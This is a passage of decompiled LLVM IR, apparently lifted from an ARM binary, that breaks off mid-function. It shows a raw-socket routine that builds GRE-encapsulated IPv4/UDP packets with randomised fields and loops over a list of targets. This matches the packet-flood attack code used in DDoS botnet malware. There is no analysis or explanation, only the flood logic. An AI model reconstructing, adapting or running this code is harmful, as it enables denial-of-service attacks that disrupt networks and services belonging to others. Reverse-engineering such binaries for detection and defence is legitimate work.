  store i32 %arg1, i32* @sl, align 4
  %v2_9a48 = call i32 @function_12654(i32 %arg1, i32 4)
  %v0_9a4c = load i32, i32* @r5, align 4
  store i32 %v0_9a4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9a5c = load i32, i32* @r4, align 4
  %v5_9a60 = inttoptr i32 %v0_9a4c to i32*
  %v6_9a60 = call i32 @function_8570(i32 %v0_9a5c, i32* %v5_9a60, i32 2, i32 0)
  %v1_9a6c = urem i32 %v6_9a60, 256
  store i32 %v1_9a6c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9a78 = load i32, i32* @r5, align 4
  store i32 %v0_9a78, i32* %r1.global-to-local, align 4
  %v0_9a7c = load i32, i32* @r4, align 4
  %v5_9a80 = trunc i32 %v6_9a60 to i8
  %v6_9a84 = inttoptr i32 %v0_9a78 to i32*
  %v7_9a84 = call i32 @function_8570(i32 %v0_9a7c, i32* %v6_9a84, i32 3, i32 65535)
  %v0_9a88 = load i32, i32* @r5, align 4
  store i32 %v0_9a88, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9a84, i32* %fp.global-to-local, align 4
  %v0_9a98 = load i32, i32* @r4, align 4
  %v4_9a9c = inttoptr i32 %v0_9a88 to i32*
  %v5_9a9c = call i32 @function_8570(i32 %v0_9a98, i32* %v4_9a9c, i32 4, i32 64)
  %v1_9aa4 = urem i32 %v5_9a9c, 256
  store i32 %v1_9aa4, i32* %ip.global-to-local, align 4
  %v0_9aa8 = load i32, i32* @r5, align 4
  store i32 %v0_9aa8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9ab4 = load i32, i32* @r4, align 4
  %v6_9abc = inttoptr i32 %v0_9aa8 to i32*
  %v7_9abc = call i32 @function_8570(i32 %v0_9ab4, i32* %v6_9abc, i32 5, i32 1)
  %v1_9ac8 = urem i32 %v7_9abc, 256
  store i32 %v1_9ac8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9ad4 = load i32, i32* @r5, align 4
  store i32 %v0_9ad4, i32* %r1.global-to-local, align 4
  %v0_9ad8 = load i32, i32* @r4, align 4
  %v5_9ae0 = inttoptr i32 %v0_9ad4 to i32*
  %v6_9ae0 = call i32 @function_8570(i32 %v0_9ad8, i32* %v5_9ae0, i32 6, i32 65535)
  %v0_9ae8 = load i32, i32* @r5, align 4
  store i32 %v0_9ae8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9ae0, i32* @r8, align 4
  %v0_9af8 = load i32, i32* @r4, align 4
  %v4_9afc = inttoptr i32 %v0_9ae8 to i32*
  %v5_9afc = call i32 @function_8570(i32 %v0_9af8, i32* %v4_9afc, i32 7, i32 65535)
  %v0_9b00 = load i32, i32* @r5, align 4
  store i32 %v0_9b00, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9afc, i32* @r7, align 4
  %v0_9b10 = load i32, i32* @r4, align 4
  %v4_9b14 = inttoptr i32 %v0_9b00 to i32*
  %v5_9b14 = call i32 @function_8570(i32 %v0_9b10, i32* %v4_9b14, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9b24 = load i32, i32* @r5, align 4
  store i32 %v0_9b24, i32* %r1.global-to-local, align 4
  %v0_9b28 = load i32, i32* @r4, align 4
  %v4_9b2c = inttoptr i32 %v0_9b24 to i32*
  %v5_9b2c = call i32 @function_8570(i32 %v0_9b28, i32* %v4_9b2c, i32 1, i32 1)
  %v1_9b34 = urem i32 %v5_9b2c, 256
  store i32 %v1_9b34, i32* %ip.global-to-local, align 4
  %v0_9b38 = load i32, i32* @r5, align 4
  store i32 %v0_9b38, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9b44 = load i32, i32* @r4, align 4
  %v5_9b4c = inttoptr i32 %v0_9b38 to i32*
  %v6_9b4c = call i32 @function_8570(i32 %v0_9b44, i32* %v5_9b4c, i32 19, i32 0)
  %v0_9b54 = load i32, i32* @r5, align 4
  store i32 %v0_9b54, i32* %r1.global-to-local, align 4
  %v2_9b58 = load i32, i32* @global_var_212d8.45, align 4
  store i32 %v2_9b58, i32* %r3.global-to-local, align 4
  store i32 %v6_9b4c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9b64 = load i32, i32* @r4, align 4
  %v4_9b68 = inttoptr i32 %v0_9b54 to i32*
  %v5_9b68 = call i32 @function_8570(i32 %v0_9b64, i32* %v4_9b68, i32 25, i32 %v2_9b58)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9b7c = call i32 @function_11aec(i32 2, i32 3, i32 6)
  %v7_9b80 = icmp eq i32 %v3_9b7c, -1
  store i1 %v7_9b80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9b80, label %dec_label_pc_a020, label %dec_label_pc_9b8c

dec_label_pc_9b8c:                                ; preds = %dec_label_pc_9a2c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9b94 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9b94, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9ba8 = call i32 @function_11aa8(i32 %v3_9b7c, i32 0, i32 3, i32 %v6_9b94, i32 4)
  %v7_9bac = icmp eq i32 %v5_9ba8, -1
  store i1 %v7_9bac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bac, label %dec_label_pc_a018, label %dec_label_pc_9bb4

dec_label_pc_9bb4:                                ; preds = %dec_label_pc_9b8c
  %v0_9bb4 = load i32, i32* @r8, align 4
  %v0_9bb8 = load i32, i32* @r7, align 4
  %v0_9bbc = load i32, i32* %fp.global-to-local, align 4
  %v0_9bc0 = load i32, i32* @r6, align 4
  %v1_9bc0 = urem i32 %v0_9bc0, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9bc8 = urem i32 %v0_9bb4, 65536
  store i32 %v3_9bc8, i32* %r3.global-to-local, align 4
  %v3_9bcc = urem i32 %v0_9bb8, 65536
  store i32 %v3_9bcc, i32* %r4.global-to-local, align 4
  %v0_9bd0 = load i32, i32* @sl, align 4
  %v2_9bd0 = icmp eq i32 %v0_9bd0, 0
  store i1 %v2_9bd0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9be8 = urem i32 %v0_9bbc, 65536
  store i32 %v3_9be8, i32* @fp, align 4
  br i1 %v2_9bd0, label %dec_label_pc_a02c, label %dec_label_pc_9bf8

dec_label_pc_9bf8:                                ; preds = %dec_label_pc_9bb4
  %v3_9bb8 = mul i32 %v0_9bb8, 65536
  %v3_9bb4 = mul i32 %v0_9bb4, 65536
  %v0_9bbc.not = or i32 %v0_9bbc, -65536
  %v1_9bfc = xor i32 %v0_9bbc.not, 65535
  %v3_9c00 = mul i32 %v5_9b14, 65536
  %v1_9c04 = add i32 %v3_9c00, 3407872
  %tmp67 = udiv i32 %v1_9c04, 256
  %v3_9c18 = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9bfc, 256
  %v3_9c1c = and i32 %tmp68, 65280
  store i32 %v3_9c1c, i32* %ip.global-to-local, align 4
  %v1_9c20 = add i32 %v3_9c00, 524288
  %v1_9c28 = add i32 %v3_9c00, 1835008
  %tmp69 = udiv i32 %v1_9bfc, 256
  %v4_9c2c = urem i32 %tmp69, 256
  %v5_9c2c = or i32 %v4_9c2c, %v3_9c1c
  %v4_9c34 = udiv i32 %v1_9c04, 16777216
  %v5_9c34 = or i32 %v3_9c18, %v4_9c34
  store i32 %v5_9c34, i32* @r8, align 4
  %v3_9c40 = udiv i32 %v1_9c28, 256
  %tmp70 = mul i32 %v0_9bbc, 256
  %v3_9c44 = and i32 %tmp70, 65280
  store i32 %v3_9bb4, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_9bbc, 256
  %v4_9c54 = urem i32 %tmp71, 256
  %v5_9c54 = or i32 %v4_9c54, %v3_9c44
  %tmp72 = mul i32 %v0_9bb4, 256
  %v3_9c58 = and i32 %tmp72, 65280
  %v1_9c5c = and i32 %v3_9c40, 65280
  store i32 %v1_9c5c, i32* @r6, align 4
  store i32 %v3_9bb8, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_9bb8, 256
  %v3_9c68 = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_9bb4, 256
  %v4_9c6c = urem i32 %tmp74, 256
  %v5_9c6c = or i32 %v4_9c6c, %v3_9c58
  store i32 %v5_9c6c, i32* @lr, align 4
  %v4_9c70 = udiv i32 %v1_9c28, 16777216
  %v5_9c70 = or i32 %v1_9c5c, %v4_9c70
  store i32 %v5_9c70, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_9bb8, 256
  %v4_9c74 = urem i32 %tmp75, 256
  %v5_9c74 = or i32 %v4_9c74, %v3_9c68
  %tmp76 = udiv i32 %v1_9c20, 256
  %v3_9c78 = and i32 %tmp76, 65280
  store i32 %v3_9c78, i32* @r5, align 4
  %v4_9c8c = udiv i32 %v1_9c20, 16777216
  %v5_9c8c = or i32 %v3_9c78, %v4_9c8c
  store i32 %v5_9c8c, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9ce0 = sext i8 %v5_9a80 to i32
  %sext12 = mul nuw i32 %v5_9c54, 65536
  %v4_9cf813 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9c70, 65536
  %v4_9d5c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9c2c, 65536
  %v4_9d60 = sdiv i32 %sext9, 65536
  %v1_9d68 = trunc i32 %v4_9d5c to i16
  %v2_9d90 = icmp eq i32 %v1_9bc0, 0
  %sext10 = mul nuw i32 %v5_9c6c, 65536
  %v4_9db0 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9c74, 65536
  %v4_9db8 = sdiv i32 %sext11, 65536
  %v1_9cf0 = trunc i32 %v5_9a9c to i8
  br label %dec_label_pc_9c94

dec_label_pc_9c94:                                ; preds = %bb82, %dec_label_pc_9bf8
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_9ca0 = call i32 @function_12654(i32 1510, i32 4)
  store i32 %v2_9a48, i32* %r2.global-to-local, align 4
  %v3_9ca8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9ca8, i32* %r3.global-to-local, align 4
  %v2_9cac = load i32, i32* @r4, align 4
  %v5_9cac = mul i32 %v2_9cac, 4
  %v6_9cac = add i32 %v5_9cac, %v2_9a48
  %v7_9cac = inttoptr i32 %v6_9cac to i32*
  store i32 %v2_9ca0, i32* %v7_9cac, align 4
  %v0_9cb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9cb0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9cb0 = mul i32 %v1_9cb0, 4
  %v5_9cb0 = add i32 %v4_9cb0, %v0_9cb0
  %v6_9cb0 = inttoptr i32 %v5_9cb0 to i32*
  %v7_9cb0 = load i32, i32* %v6_9cb0, align 4
  store i32 %v7_9cb0, i32* %r4.global-to-local, align 4
  %v1_9cb4 = inttoptr i32 %v7_9cb0 to i8*
  %v2_9cb4 = load i8, i8* %v1_9cb4, align 1
  %tmp = urem i8 %v2_9cb4, 16
  %v1_9cb8 = zext i8 %tmp to i32
  %v1_9cbc = or i32 %v1_9cb8, 64
  store i32 %v1_9cbc, i32* %r2.global-to-local, align 4
  %v1_9cc0 = trunc i32 %v1_9cbc to i8
  store i8 %v1_9cc0, i8* %v1_9cb4, align 1
  %v0_9cc4 = load i32, i32* %r3.global-to-local, align 4
  %v5_9cc8 = mul i32 %v0_9cc4, 24
  store i32 %v5_9cc8, i32* %r1.global-to-local, align 4
  %v0_9ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_9ccc = inttoptr i32 %v0_9ccc to i8*
  %v2_9ccc = load i8, i8* %v1_9ccc, align 1
  %v1_9cd0 = and i8 %v2_9ccc, -16
  %v1_9cd4 = or i8 %v1_9cd0, 5
  store i32 %v1_9ac8, i32* %r5.global-to-local, align 4
  store i8 %v1_9cd4, i8* %v1_9ccc, align 1
  store i32 %v4_9ce0, i32* %r2.global-to-local, align 4
  %v2_9ce4 = load i32, i32* %r4.global-to-local, align 4
  %v3_9ce4 = add i32 %v2_9ce4, 1
  %v4_9ce4 = inttoptr i32 %v3_9ce4 to i8*
  store i8 %v5_9a80, i8* %v4_9ce4, align 1
  store i32 %v1_9aa4, i32* %r3.global-to-local, align 4
  %v0_9cec = load i32, i32* %r5.global-to-local, align 4
  %v2_9cec = icmp eq i32 %v0_9cec, 0
  store i1 %v2_9cec, i1* %cpsr_z.global-to-local, align 1
  %v2_9cf0 = load i32, i32* %r4.global-to-local, align 4
  %v3_9cf0 = add i32 %v2_9cf0, 8
  %v4_9cf0 = inttoptr i32 %v3_9cf0 to i8*
  store i8 %v1_9cf0, i8* %v4_9cf0, align 1
  %v0_9cf4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9cf4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_9c94
  store i32 %v4_9cf813, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_9c94
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_9cf813, i32* %r5.global-to-local, align 4
  %v3_9cfc = load i32, i32* %r4.global-to-local, align 4
  %v4_9cfc = add i32 %v3_9cfc, 6
  %v5_9cfc = inttoptr i32 %v4_9cfc to i16*
  store i16 64, i16* %v5_9cfc, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9d04 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d04 = add i32 %v2_9d04, 9
  %v4_9d04 = inttoptr i32 %v3_9d04 to i8*
  store i8 47, i8* %v4_9d04, align 1
  %v0_9d08 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d08 = add i32 %v0_9d08, 20
  store i32 %v1_9d08, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9d10 = load i32, i32* %r5.global-to-local, align 4
  %v1_9d10 = trunc i32 %v0_9d10 to i16
  %v3_9d10 = add i32 %v0_9d08, 4
  %v4_9d10 = inttoptr i32 %v3_9d10 to i16*
  store i16 %v1_9d10, i16* %v4_9d10, align 2
  %v0_9d14 = load i32, i32* @r8, align 4
  %v1_9d14 = trunc i32 %v0_9d14 to i16
  %v2_9d14 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d14 = add i32 %v2_9d14, 2
  %v4_9d14 = inttoptr i32 %v3_9d14 to i16*
  store i16 %v1_9d14, i16* %v4_9d14, align 2
  %v0_9d18 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d18 = trunc i32 %v0_9d18 to i16
  %v2_9d18 = load i32, i32* %r2.global-to-local, align 4
  %v3_9d18 = add i32 %v2_9d18, 2
  %v4_9d18 = inttoptr i32 %v3_9d18 to i16*
  store i16 %v1_9d18, i16* %v4_9d18, align 2
  store i32 %v5_9b68, i32* %r3.global-to-local, align 4
  %v0_9d20 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d20 = add i32 %v0_9d20, 24
  %v2_9d20 = inttoptr i32 %v1_9d20 to i8*
  %v3_9d20 = load i8, i8* %v2_9d20, align 1
  %v4_9d20 = zext i8 %v3_9d20 to i32
  store i32 %v4_9d20, i32* %r2.global-to-local, align 4
  %v2_9d24 = add i32 %v0_9d20, 12
  %v3_9d24 = inttoptr i32 %v2_9d24 to i32*
  store i32 %v5_9b68, i32* %v3_9d24, align 4
  %v0_9d28 = load i32, i32* %r2.global-to-local, align 4
  %v1_9d28 = and i32 %v0_9d28, -241
  %v1_9d2c = or i32 %v1_9d28, 64
  store i32 %v1_9d2c, i32* %r2.global-to-local, align 4
  %v0_9d30 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d30 = load i32, i32* @sb, align 4
  %v2_9d30 = add i32 %v1_9d30, %v0_9d30
  store i32 %v2_9d30, i32* %r1.global-to-local, align 4
  %v1_9d34 = add i32 %v2_9d30, 16
  %v2_9d34 = inttoptr i32 %v1_9d34 to i32*
  %v3_9d34 = load i32, i32* %v2_9d34, align 4
  store i32 %v3_9d34, i32* %r1.global-to-local, align 4
  %v1_9d38 = trunc i32 %v1_9d2c to i8
  %v2_9d38 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d38 = add i32 %v2_9d38, 24
  %v4_9d38 = inttoptr i32 %v3_9d38 to i8*
  store i8 %v1_9d38, i8* %v4_9d38, align 1
  %v0_9d3c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d3c = add i32 %v0_9d3c, 24
  %v2_9d3c = inttoptr i32 %v1_9d3c to i8*
  %v3_9d3c = load i8, i8* %v2_9d3c, align 1
  %v1_9d40 = and i8 %v3_9d3c, -16
  %v1_9d44 = or i8 %v1_9d40, 5
  store i8 %v1_9d44, i8* %v2_9d3c, align 1
  %v0_9d4c = load i32, i32* %r1.global-to-local, align 4
  %v1_9d4c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d4c = add i32 %v1_9d4c, 16
  %v3_9d4c = inttoptr i32 %v2_9d4c to i32*
  store i32 %v0_9d4c, i32* %v3_9d4c, align 4
  %v0_9d54 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d54 = add i32 %v0_9d54, 24
  store i32 %v1_9d54, i32* @r5, align 4
  %v3_9d58 = add i32 %v0_9d54, 25
  %v4_9d58 = inttoptr i32 %v3_9d58 to i8*
  store i8 %v5_9a80, i8* %v4_9d58, align 1
  store i32 %v4_9d5c, i32* %r2.global-to-local, align 4
  store i32 %v4_9d60, i32* %r3.global-to-local, align 4
  store i32 %v1_9aa4, i32* %r1.global-to-local, align 4
  %v2_9d68 = load i32, i32* @r5, align 4
  %v3_9d68 = add i32 %v2_9d68, 2
  %v4_9d68 = inttoptr i32 %v3_9d68 to i16*
  store i16 %v1_9d68, i16* %v4_9d68, align 2
  %v0_9d6c = load i32, i32* %r3.global-to-local, align 4
  %v1_9d6c = trunc i32 %v0_9d6c to i16
  %v2_9d6c = load i32, i32* @r5, align 4
  %v3_9d6c = add i32 %v2_9d6c, 4
  %v4_9d6c = inttoptr i32 %v3_9d6c to i16*
  store i16 %v1_9d6c, i16* %v4_9d6c, align 2
  %v0_9d70 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d70, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_9d78 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d78 = trunc i32 %v0_9d78 to i8
  %v2_9d78 = load i32, i32* @r5, align 4
  %v3_9d78 = add i32 %v2_9d78, 8
  %v4_9d78 = inttoptr i32 %v3_9d78 to i8*
  store i8 %v1_9d78, i8* %v4_9d78, align 1
  %v0_9d7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d7c, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9d7c = load i32, i32* %r2.global-to-local, align 4
  %v2_9d7c = trunc i32 %v1_9d7c to i16
  %v3_9d7c = load i32, i32* @r5, align 4
  %v4_9d7c = add i32 %v3_9d7c, 6
  %v5_9d7c = inttoptr i32 %v4_9d7c to i16*
  store i16 %v2_9d7c, i16* %v5_9d7c, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9d80 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d80 = trunc i32 %v0_9d80 to i8
  %v2_9d80 = load i32, i32* @r5, align 4
  %v3_9d80 = add i32 %v2_9d80, 9
  %v4_9d80 = inttoptr i32 %v3_9d80 to i8*
  store i8 %v1_9d80, i8* %v4_9d80, align 1
  %v0_9d84 = call i32 @function_e0d0()
  store i32 %v1_9bc0, i32* %r1.global-to-local, align 4
  store i1 %v2_9d90, i1* %cpsr_z.global-to-local, align 1
  %v1_9d94 = sub i32 1023, %v0_9d84
  store i32 %v1_9d94, i32* %r3.global-to-local, align 4
  br i1 %v2_9d90, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_9d9c = load i32, i32* @r5, align 4
  %v3_9d9c = add i32 %v2_9d9c, 16
  %v4_9d9c = inttoptr i32 %v3_9d9c to i32*
  store i32 %v1_9d94, i32* %v4_9d9c, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_9d98 = load i32, i32* %r4.global-to-local, align 4
  %v2_9d98 = add i32 %v1_9d98, 16
  %v3_9d98 = inttoptr i32 %v2_9d98 to i32*
  %v4_9d98 = load i32, i32* %v3_9d98, align 4
  store i32 %v4_9d98, i32* %r3.global-to-local, align 4
  %v2_9da0 = load i32, i32* @r5, align 4
  %v3_9da0 = add i32 %v2_9da0, 16
  %v4_9da0 = inttoptr i32 %v3_9da0 to i32*
  store i32 %v4_9d98, i32* %v4_9da0, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_9da4 = load i32, i32* @r5, align 4
  %v2_9da4 = add i32 %v1_9da4, 12
  %v3_9da4 = inttoptr i32 %v2_9da4 to i32*
  store i32 %v0_9d84, i32* %v3_9da4, align 4
  %v3_9da8 = load i32, i32* %stack_var_-44, align 4
  %v0_9dac = load i32, i32* %r4.global-to-local, align 4
  %v1_9dac = add i32 %v0_9dac, 44
  store i32 %v1_9dac, i32* @r6, align 4
  store i32 %v4_9db0, i32* %r2.global-to-local, align 4
  %v1_9db4 = add i32 %v3_9da8, 1
  store i32 %v1_9db4, i32* @r4, align 4
  store i32 %v4_9db8, i32* %r3.global-to-local, align 4
  %v1_9dbc = load i32, i32* @sl, align 4
  %v9_9dbc = icmp eq i32 %v1_9db4, %v1_9dbc
  store i1 %v9_9dbc, i1* %cpsr_z.global-to-local, align 1
  %v0_9dc0 = load i32, i32* @r7, align 4
  %v1_9dc0 = trunc i32 %v0_9dc0 to i16
  %v3_9dc0 = add i32 %v0_9dac, 48
  %v4_9dc0 = inttoptr i32 %v3_9dc0 to i16*
  store i16 %v1_9dc0, i16* %v4_9dc0, align 2
  %v0_9dc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_9dc4 = trunc i32 %v0_9dc4 to i16
  %v2_9dc4 = load i32, i32* @r6, align 4
  %v3_9dc4 = inttoptr i32 %v2_9dc4 to i16*
  store i16 %v1_9dc4, i16* %v3_9dc4, align 2
  %v0_9dc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9dc8 = trunc i32 %v0_9dc8 to i16
  %v2_9dc8 = load i32, i32* @r6, align 4
  %v3_9dc8 = add i32 %v2_9dc8, 2
  %v4_9dc8 = inttoptr i32 %v3_9dc8 to i16*
  store i16 %v1_9dc8, i16* %v4_9dc8, align 2
  %v0_9dcc = load i32, i32* @r4, align 4
  store i32 %v0_9dcc, i32* %stack_var_-44, align 4
  %v5_9dd0 = icmp slt i32 %v1_9db4, %v1_9dbc
  br i1 %v5_9dd0, label %dec_label_pc_9c94, label %dec_label_pc_9dd4

dec_label_pc_9dd4:                                ; preds = %bb82
  store i32 %v5_9b14, i32* %r5.global-to-local, align 4
  %v1_9ddc = add i32 %v5_9b14, 8
  store i32 %v1_9ddc, i32* %r4.global-to-local, align 4
  %v0_9dec.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_9de8.preheader

dec_label_pc_9de8.preheader:                      ; preds = %dec_label_pc_9dd4, %dec_label_pc_a02c
  %v0_9dec.pre = phi i32 [ %v0_9dec.pre.pre, %dec_label_pc_9dd4 ], [ 0, %dec_label_pc_a02c ]
  %stack_var_-124.0.ph = phi i32 [ %v1_9ddc, %dec_label_pc_9dd4 ], [ %v1_a034, %dec_label_pc_a02c ]
  %storemerge = add i32 %v5_9b14, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_9fe0 = icmp eq i32 %v1_9bc0, 0
  %v2_9ffc = icmp eq i32 %v1_9b34, 0
  %v2_9e28 = icmp eq i32 %v5_9b68, -1
  %v7_9e28 = icmp eq i32 %v5_9b68, -1
  br label %dec_label_pc_9de8

dec_label_pc_9de8:                                ; preds = %dec_label_pc_9de8, %dec_label_pc_9e78, %dec_label_pc_9de8.preheader
  %v0_9dec = phi i32 [ %v0_9dec.pre, %dec_label_pc_9de8.preheader ], [ 0, %dec_label_pc_9de8 ], [ %v1_9f14, %dec_label_pc_9e78 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9dec = icmp eq i32 %v0_9dec, 0
  store i1 %v2_9dec, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9dec, label %dec_label_pc_9de8, label %dec_label_pc_9df8

dec_label_pc_9df8:                                ; preds = %dec_label_pc_9de8
  br label %dec_label_pc_9dfc

dec_label_pc_9dfc:                                ; preds = %dec_label_pc_9e78, %dec_label_pc_9df8
  %v1_9e10 = phi i32 [ %v1_9f10, %dec_label_pc_9e78 ], [ 0, %dec_label_pc_9df8 ]
  %v5_9e00 = mul i32 %v1_9e10, 24
  %v1_9e04 = load i32, i32* @sb, align 4
  %v2_9e04 = add i32 %v1_9e04, %v5_9e00
  store i32 %v2_9e04, i32* %r3.global-to-local, align 4
  store i32 %v2_9a48, i32* %r4.global-to-local, align 4
  %v1_9e0c = add i32 %v2_9e04, 20
  %v2_9e0c = inttoptr i32 %v1_9e0c to i8*
  %v3_9e0c = load i8, i8* %v2_9e0c, align 1
  %v4_9e0c = zext i8 %v3_9e0c to i32
  store i32 %v4_9e0c, i32* %r2.global-to-local, align 4
  %v4_9e10 = mul i32 %v1_9e10, 4
  %v5_9e10 = add i32 %v4_9e10, %v2_9a48
  %v6_9e10 = inttoptr i32 %v5_9e10 to i32*
  %v7_9e10 = load i32, i32* %v6_9e10, align 4
  store i32 %v7_9e10, i32* @r5, align 4
  %v7_9e14 = icmp eq i8 %v3_9e0c, 31
  store i1 %v7_9e14, i1* %cpsr_z.global-to-local, align 1
  %v1_9e18 = add i32 %v7_9e10, 24
  store i32 %v1_9e18, i32* @r6, align 4
  %v1_9e1c = add i32 %v7_9e10, 44
  store i32 %v1_9e1c, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_9e0c, 32
  br i1 %tmp86, label %dec_label_pc_9f24, label %dec_label_pc_9e24

dec_label_pc_9e24:                                ; preds = %dec_label_pc_9dfc
  store i32 %v5_9b68, i32* %r1.global-to-local, align 4
  store i1 %v7_9e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9e28, label %dec_label_pc_9f84, label %dec_label_pc_9e30

dec_label_pc_9e30:                                ; preds = %dec_label_pc_9f24, %dec_label_pc_9e24
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9e38 = load i32, i32* @fp, align 4
  %v9_9e38 = icmp eq i32 %v0_9e38, 65535
  store i1 %v9_9e38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e38, label %dec_label_pc_9f9c, label %dec_label_pc_9e40

dec_label_pc_9e40:                                ; preds = %dec_label_pc_9f84.dec_label_pc_9e40_crit_edge, %dec_label_pc_9e30
  %v1_9e44 = phi i32 [ %v1_9e44.pre, %dec_label_pc_9f84.dec_label_pc_9e40_crit_edge ], [ 65535, %dec_label_pc_9e30 ]
  store i32 %v3_9bc8, i32* %r2.global-to-local, align 4
  %v9_9e44 = icmp eq i32 %v3_9bc8, %v1_9e44
  store i1 %v9_9e44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e44, label %dec_label_pc_9fc4, label %dec_label_pc_9e4c

dec_label_pc_9e4c:                                ; preds = %dec_label_pc_9f9c.dec_label_pc_9e4c_crit_edge, %dec_label_pc_9e40
  %v1_9e50 = phi i32 [ %v1_9e50.pre, %dec_label_pc_9f9c.dec_label_pc_9e4c_crit_edge ], [ %v1_9e44, %dec_label_pc_9e40 ]
  store i32 %v3_9bcc, i32* %r3.global-to-local, align 4
  %v9_9e50 = icmp eq i32 %v3_9bcc, %v1_9e50
  store i1 %v9_9e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e50, label %dec_label_pc_9fd8, label %dec_label_pc_9e58

dec_label_pc_9e58:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9e4c
  store i32 %v1_9bc0, i32* @r4, align 4
  store i1 %v2_9fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9fe0, label %dec_label_pc_9ff4, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_9e58
  %v1_9e60 = load i32, i32* @r5, align 4
  %v2_9e60 = add i32 %v1_9e60, 16
  %v3_9e60 = inttoptr i32 %v2_9e60 to i32*
  %v4_9e60 = load i32, i32* %v3_9e60, align 4
  store i32 %v4_9e60, i32* %r3.global-to-local, align 4
  %v2_9e64 = load i32, i32* @r6, align 4
  %v3_9e64 = add i32 %v2_9e64, 16
  %v4_9e64 = inttoptr i32 %v3_9e64 to i32*
